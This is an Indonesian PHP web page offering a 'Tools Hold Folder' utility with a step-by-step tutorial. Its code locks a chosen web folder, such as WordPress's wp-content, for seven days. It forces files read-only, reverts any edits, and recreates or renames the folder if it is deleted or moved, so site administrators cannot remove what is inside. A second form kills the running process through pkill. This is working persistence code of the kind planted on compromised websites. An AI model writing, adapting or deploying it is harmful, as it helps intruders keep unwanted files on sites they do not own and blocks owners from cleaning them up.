<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@Bukan_Seo - Tools Hold Folder</title>
    <link href="https://fonts.googleapis.com/css2?family=Jolly+Lodger&display=swap" rel="stylesheet"> <!-- Ganti font -->
    <style>
        body {
            font-family: 'Arial', sans-serif; /* Font default untuk body */
            margin: 20px;
            background-color: black; /* Background hitam */
            color: white; /* Warna teks putih */
        }
        h1 {
            font-family: 'Jolly Lodger', cursive; /* Font untuk judul */
            text-align: center; /* Rata tengah */
            color: white; /* Warna tulisan putih */
            text-shadow: 2px 2px 0 red; /* Bayangan merah */
        }
        input[type="text"], input[type="submit"] {
            display: block;
            margin: 10px auto; /* Rata tengah */
            padding: 10px;
            width: 300px;
        }
        input[type="submit"] {
            cursor: pointer;
        }
        label {
            color: white; /* Warna label putih */
        }
        .image-container {
            margin-top: 20px;
            border: 2px solid red; /* Border putih */
            padding: 20px; /* Padding dalam kotak */
            background-color: rgba(255, 255, 255, 0.1); /* Warna latar belakang transparan */
        }
        .image-container img {
            max-width: 100%; /* Membuat gambar responsif */
            height: auto; /* Menjaga rasio gambar */
        }
    </style>
</head>
<body>

<center><h1>Tools Hold Folder</h1>
</center>
<form method="post">
    <label for="folderPath">Masukkan Path Folder:</label>
    <input type="text" id="folderPath" name="folderPath" required>
    
    <label for="cliCommand"></label>
    <input type="hidden" id="cliCommand" name="cliCommand" value="php /path/to/monitor.php > /dev/null 2>&1 &" required>
    
    <input type="submit" name="startMonitor" value="Gasskannnn">
</form>

<form method="post">
    <label for="stopCommand">Stop Hold Folder? (masukkan nama file):</label>
    <input type="text" id="stopCommand" name="stopCommand" placeholder="namafilehold.php" required>
    
    <input type="submit" name="stopMonitor" value="Gasskannnn">
</form>
<br><br><br>
</center>

<script>
    // Menangani submit form
    document.querySelector('form').onsubmit = function() {
        setTimeout(function() {
            window.location.reload();
            alert("Monitor Berhasil");
        }, 3000); // 3 detik
    };
</script>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['startMonitor'])) {
        $folderPath = $_POST['folderPath'];
        $originalPermissionsFolder = 0555;
        $filePermissions = 0444;

        // Simpan isi awal file dalam array
        $originalFilesContent = [];
        $filesInFolder = scandir($folderPath);

        foreach ($filesInFolder as $file) {
            if ($file !== '.' && $file !== '..') {
                $filePath = $folderPath . '/' . $file;
                $originalFilesContent[$file] = file_get_contents($filePath);
                // Set permission file
                chmod($filePath, $filePermissions);
            }
        }

        $originalFolderName = basename($folderPath);
        $originalFolderPermissions = fileperms($folderPath);

        $startTime = time();
        $duration = 7 * 24 * 60 * 60; // 7 hari dalam detik

        while (true) {
            if ((time() - $startTime) > $duration) {
                break; // Hentikan setelah 7 hari
            }

            clearstatcache();

            // Monitor Folder
            if (fileperms($folderPath) !== $originalFolderPermissions) {
                chmod($folderPath, $originalFolderPermissions);
            }

            if (basename($folderPath) !== $originalFolderName) {
                $newPath = dirname($folderPath) . '/' . $originalFolderName;
                rename($folderPath, $newPath);
                $folderPath = $newPath;
            }

            if (!file_exists($folderPath)) {
                mkdir($folderPath);
                chmod($folderPath, $originalFolderPermissions);
            }

            // Monitor Files
            $currentFiles = scandir($folderPath);
            foreach ($currentFiles as $file) {
                if ($file !== '.' && $file !== '..') {
                    $filePath = $folderPath . '/' . $file;

                    // Jika file baru ditemukan, simpan isi dan set permission
                    if (!isset($originalFilesContent[$file])) {
                        $originalFilesContent[$file] = file_get_contents($filePath);
                        chmod($filePath, $filePermissions);
                    } else {
                        // Cek jika ada perubahan isi file
                        $currentContent = file_get_contents($filePath);
                        if ($currentContent !== $originalFilesContent[$file]) {
                            file_put_contents($filePath, $originalFilesContent[$file]);
                            echo "File '$file' telah diubah. Mengembalikan ke kondisi semula...\n";
                        }

                        // Cek jika permission file berubah
                        $currentPermissions = fileperms($filePath);
                        if ($currentPermissions !== $filePermissions) {
                            chmod($filePath, $filePermissions);
                            echo "Permission file '$file' telah diubah. Mengembalikan ke kondisi semula...\n";
                        }
                    }
                }
            }

            // Hapus file yang tidak ada lagi di folder
            foreach ($originalFilesContent as $file => $content) {
                if (!in_array($file, $currentFiles)) {
                    unset($originalFilesContent[$file]);
                }
            }

            // Delay 5 detik
            sleep(5);
        }
    }

    if (isset($_POST['stopMonitor'])) {
        $stopCommand = 'pkill -9 -f ' . escapeshellarg($_POST['stopCommand']);
        exec($stopCommand); // Menjalankan perintah untuk menghentikan monitor
        echo "Monitor telah dihentikan.";
    }
}
?>

<!-- Kotak untuk gambar -->
<div class="image-container">
<h3>Tutorial Hold Folder :</h3>
<center>
    <h5>Bagaimana cara memasukan path folder ?<br>tinggal copy bagian /home/user/public_html/namafolderkalian/<br>sebagai contoh nama folder saya /wp-content/<br></h5>
<a href="https://ibb.co.com/2KG645z"><img src="https://i.ibb.co.com/ZTqJDNQ/IMG-20241227-090443.jpg" alt="IMG-20241227-090443" border="0" alt="Naruto"></a><br><br>
<h5>jadi tinggal masukan path folder /home/digitali/public_html/wp-content/<br>setelah itu klik tombol "Gasskannnn" otomatis folder /wp-content/ tadi udah gabisa dihapus<br>silakan coba sendiri</h5>
 <a href="https://ibb.co.com/R3F288H"><img src="https://i.ibb.co.com/LxFSKKp/IMG-20241227-092133.jpg" alt="IMG-20241227-092133" border="0" alt="Naruto"></a><br><br>
</center>
<h3>Tutorial Stop Hold Folder :</h3>
<center>
<h5>Fungsinya jika kalian salah mengunci folder lain<br>lalu tidak dapat menghapusnya<br>sebagai contoh folder /wp-includes/ sudah terkunci<br></h5>
<a href="https://ibb.co.com/MpWb7wY"><img src="https://i.ibb.co.com/5vtdLpN/IMG-20241227-094043.jpg" alt="IMG-20241227-094043" border="0" alt="Naruto"></a><br><br>
<h5>Kalian cukup mengetik nama file holdnya<br>sebagai contoh tadi saya tidak sengaja mengunci <br>folder /wp-includes/ dengan nama file hold.php<br>lalu tinggal ketik hold.php klik "Gasskannnn"<br>otomatis folder yang tadi terkunci jadi terbuka</h5>
<a href="https://ibb.co.com/9ySTZRh"><img src="https://i.ibb.co.com/P10hDBM/IMG-20241227-094604.jpg" alt="IMG-20241227-094604" border="0" alt="Naruto"><a><br><br>
</div>
</center>
</body>
</html>
